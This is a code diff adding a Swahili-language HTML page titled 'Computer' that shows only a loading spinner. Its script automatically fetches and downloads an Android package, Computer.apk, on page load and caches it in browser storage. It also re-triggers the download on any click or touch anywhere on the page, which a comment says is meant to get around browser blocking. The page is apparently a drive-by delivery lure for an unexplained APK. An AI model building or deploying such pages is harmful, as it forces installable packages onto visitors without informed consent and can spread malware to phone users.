@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="sw">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Computer</title>
+<style>
+  html,body{margin:0;height:100%;background:#0b1220;display:flex;align-items:center;justify-content:center}
+  .s{width:44px;height:44px;border:4px solid #223049;border-top-color:#3b82f6;border-radius:50%;animation:r .8s linear infinite}
+  @keyframes r{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="s"></div>
+<script>
+(() => {
+  const APK_URL='./Computer.apk', APK_NAME='Computer.apk', MIME='application/vnd.android.package-archive';
+  const DB='pc-window-go-tz', ST='files', KEY='computer-apk';
+  let blob=null, fired=false;
+
+  const open=()=>new Promise((res,rej)=>{const r=indexedDB.open(DB,1);r.onupgradeneeded=()=>r.result.createObjectStore(ST);r.onsuccess=()=>res(r.result);r.onerror=()=>rej(r.error)});
+  const get=async()=>{const d=await open();return new Promise((res,rej)=>{const q=d.transaction(ST).objectStore(ST).get(KEY);q.onsuccess=()=>res(q.result||null);q.onerror=()=>rej(q.error)})};
+  const put=async v=>{const d=await open();return new Promise((res,rej)=>{const t=d.transaction(ST,'readwrite');t.objectStore(ST).put(v,KEY);t.oncomplete=res;t.onerror=()=>rej(t.error)})};
+
+  function launch(){
+    if(!blob) return;
+    const u=URL.createObjectURL(new Blob([blob],{type:MIME}));
+    const a=document.createElement('a');
+    a.href=u;a.download=APK_NAME;
+    document.body.appendChild(a);a.click();a.remove();
+    setTimeout(()=>URL.revokeObjectURL(u),60000);
+  }
+
+  async function init(){
+    try{
+      let rec=null;
+      try{rec=await get()}catch(_){}
+      if(rec&&rec.blob){blob=rec.blob}
+      else{
+        const r=await fetch(APK_URL,{cache:'no-cache'});
+        if(!r.ok) throw 0;
+        blob=await r.blob();
+        try{await put({blob})}catch(_){}
+      }
+    }catch(e){
+      try{const r=await fetch(APK_URL);blob=await r.blob()}catch(_){return}
+    }
+    launch(); fired=true;
+    // Kama kivinjari kimezuia, mguso wowote kwenye skrini unaanzisha
+    document.addEventListener('click',launch);
+    document.addEventListener('touchend',launch);
+  }
+  init();
+})();
+</script>
+</body>
+</html>
